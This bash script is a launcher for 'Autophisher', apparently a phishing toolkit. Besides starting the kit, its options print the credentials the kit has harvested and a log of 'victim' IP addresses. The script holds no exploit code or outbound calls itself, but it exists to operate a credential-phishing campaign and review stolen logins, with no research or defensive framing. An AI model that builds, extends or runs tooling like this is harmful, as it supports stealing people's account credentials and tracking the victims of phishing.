#!/bin/bash

# https://github.com/CodingRanjith/autophisher

# --- Color Definitions (if terminal supports colors) ---
if [[ -t 1 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[0;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    BOLD='\033[1m'
    NC='\033[0m' # No Color
else
    RED='' GREEN='' YELLOW='' BLUE='' CYAN='' BOLD='' NC=''
fi

# --- Helper Functions ---
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-] Error:${NC} $1" >&2; }

show_help() {
    echo -e "${CYAN}${BOLD}Autophisher Wrapper Script${NC}"
    echo -e "Usage: ${GREEN}autophisher${NC} [option]"
    echo
    echo -e "${BOLD}Options:${NC}"
    echo -e "  ${GREEN}-h, --help, help${NC}       Show this help menu and exit"
    echo -e "  ${GREEN}-c, --auth, auth${NC}       View saved credentials"
    echo -e "  ${GREEN}-i, --ip, ip${NC}           View saved victim IP addresses"
    echo
    echo -e "If no option is provided, the script will launch Autophisher directly."
}

# --- Environment and Path Detection ---
if [[ -n "$TERMUX_VERSION" || -d "/data/data/com.termux/files/usr" ]]; then
    DEFAULT_ROOT="/data/data/com.termux/files/usr/opt/autophisher"
else
    DEFAULT_ROOT="/opt/autophisher"
fi

# Allow environment override for AUTOPHISHER_ROOT, fallback to detected default
export AUTOPHISHER_ROOT="${AUTOPHISHER_ROOT:-$DEFAULT_ROOT}"

# --- Argument Parsing ---
case "$1" in
    -h|--help|help)
        show_help
        exit 0
        ;;
    -c|--auth|auth|credentials)
        AUTH_FILE="$AUTOPHISHER_ROOT/auth/usernames.dat"
        if [[ -f "$AUTH_FILE" ]]; then
            if [[ -s "$AUTH_FILE" ]]; then
                log_success "Saved Credentials Found:"
                echo -e "${CYAN}----------------------------------------${NC}"
                cat "$AUTH_FILE"
                echo -e "${CYAN}----------------------------------------${NC}"
            else
                log_warning "Credentials file exists but is empty."
            fi
        else
            log_error "No Credentials Found! (File not found: $AUTH_FILE)"
            exit 1
        fi
        ;;
    -i|--ip|ip|victims)
        IP_FILE="$AUTOPHISHER_ROOT/auth/ip.txt"
        if [[ -f "$IP_FILE" ]]; then
            if [[ -s "$IP_FILE" ]]; then
                log_success "Saved Victim IPs Found:"
                echo -e "${CYAN}----------------------------------------${NC}"
                cat "$IP_FILE"
                echo -e "${CYAN}----------------------------------------${NC}"
            else
                log_warning "IP log file exists but is empty."
            fi
        else
            log_error "No Saved IP Found! (File not found: $IP_FILE)"
            exit 1
        fi
        ;;
    "")
        # Run autophisher
        if [[ ! -d "$AUTOPHISHER_ROOT" ]]; then
            log_error "Autophisher root directory not found at: $AUTOPHISHER_ROOT"
            log_info "Please ensure Autophisher is cloned/installed at that path,"
            log_info "or set the AUTOPHISHER_ROOT environment variable to the correct path."
            exit 1
        fi

        if [[ ! -f "$AUTOPHISHER_ROOT/autophisher.sh" ]]; then
            log_error "autophisher.sh script not found inside: $AUTOPHISHER_ROOT"
            exit 1
        fi

        log_info "Launching Autophisher..."
        cd "$AUTOPHISHER_ROOT" || { log_error "Failed to change directory to $AUTOPHISHER_ROOT"; exit 1; }
        
        # Verify script is executable
        if [[ ! -x "./autophisher.sh" ]]; then
            log_warning "autophisher.sh is not executable. Attempting to make it executable..."
            chmod +x ./autophisher.sh || { log_error "Failed to make autophisher.sh executable."; exit 1; }
        fi

        bash ./autophisher.sh
        ;;
    *)
        log_error "Unknown option: $1"
        echo
        show_help
        exit 1
        ;;
esac
